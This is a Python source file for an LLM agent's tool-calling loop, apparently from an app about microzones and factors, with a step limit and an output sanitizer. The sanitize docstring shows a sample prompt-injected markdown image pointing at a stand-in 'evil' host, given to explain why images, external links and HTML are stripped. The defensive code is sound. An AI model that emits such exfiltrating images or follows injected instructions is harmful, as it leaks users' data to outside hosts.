"""The agent loop: the model calls tools until it can answer.

    question -> model -> tool calls -> results -> model -> ... -> answer

At most `max_steps` model calls may use tools. After that the model is told to
answer with what it has, so a confused model can't loop forever.
"""

import re
from collections.abc import AsyncGenerator
from dataclasses import dataclass
from typing import Any

from agent.catalog import AgentContext
from agent.llm import LLMClient, Usage
from agent.prompt import system_prompt
from agent.tools import ToolResult, run_tool, tool_schemas
from app.database import Database

FINAL_NUDGE = (
    "Stop calling tools. Answer the question now with the results you have; "
    "if they are not enough, say what is missing."
)
NO_ANSWER = (
    "Sorry, I couldn't work that out. Try asking more specifically, "
    "for example by naming a microzone, a factor or a preset."
)

_TARGET = r"\((?:[^()]|\([^()]*\))*\)"  # (url), allowing one level of nested brackets
_IMAGE = re.compile(r"!\[[^\]]*\](?:" + _TARGET + r"|\[[^\]]*\])")
_EXTERNAL_LINK = re.compile(
    r"\[([^\]]*)\]\((?=\s*(?:[a-zA-Z][a-zA-Z0-9+.-]*:|//))(?:[^()]|\([^()]*\))*\)"
)
_LINK_DEFINITION = re.compile(r"^\s*\[[^\]]+\]:\s*\S+.*$", re.MULTILINE)
_HTML_TAG = re.compile(r"</?[a-zA-Z][^>]*>")
# Earlier versions put this note in conversation history, and models copied it.
_QUERY_NOTE = re.compile(r"^[ \t]*\[Queries behind this answer:.*$\n?", re.MULTILINE)


@dataclass
class Step:
    tool: str
    arguments: dict[str, Any] | None
    result: ToolResult


@dataclass
class Answer:
    text: str
    usage: Usage


async def run(
    llm: LLMClient,
    ctx: AgentContext,
    db: Database,
    history: list[dict[str, Any]],
    question: str,
    max_steps: int,
) -> AsyncGenerator[Step | Answer, None]:
    """Yield each tool step as it finishes, then the answer."""
    messages: list[dict[str, Any]] = [
        {"role": "system", "content": system_prompt(ctx)},
        *history,
        {"role": "user", "content": question},
    ]
    tools = tool_schemas()
    usage = Usage()
    done: dict[str, ToolResult] = {}

    for _ in range(max_steps):
        reply = await llm.chat(messages, tools)
        usage.add(reply.usage)
        if not reply.tool_calls:
            yield Answer(sanitize(reply.content) or NO_ANSWER, usage)
            return

        messages.append(reply.as_message())
        for call in reply.tool_calls:
            result = done.get(call.key)
            if result is None:  # a repeated call gets the earlier result, unannounced
                result = await run_tool(call, ctx, db)
                done[call.key] = result
                yield Step(call.name, call.arguments, result)
            messages.append({"role": "tool", "tool_call_id": call.id, "content": result.for_model})

    messages.append({"role": "user", "content": FINAL_NUDGE})
    reply = await llm.chat(messages, tools)
    usage.add(reply.usage)
    text = "" if reply.tool_calls else sanitize(reply.content)
    yield Answer(text or NO_ANSWER, usage)


def sanitize(text: str) -> str:
    """
    Strip what could leak data or run code when the answer is rendered: images
    (fetched automatically, so a prompt-injected `![](https://evil/?q=...)` would
    send data out), links to other sites (kept as plain text) and raw HTML. Also
    strip internal notes about queries, which belong in the steps, not the answer.
    """
    text = _QUERY_NOTE.sub("", text)
    text = _IMAGE.sub("", text)
    text = _EXTERNAL_LINK.sub(r"\1", text)
    text = _LINK_DEFINITION.sub("", text)
    text = _HTML_TAG.sub("", text)
    return text.strip()
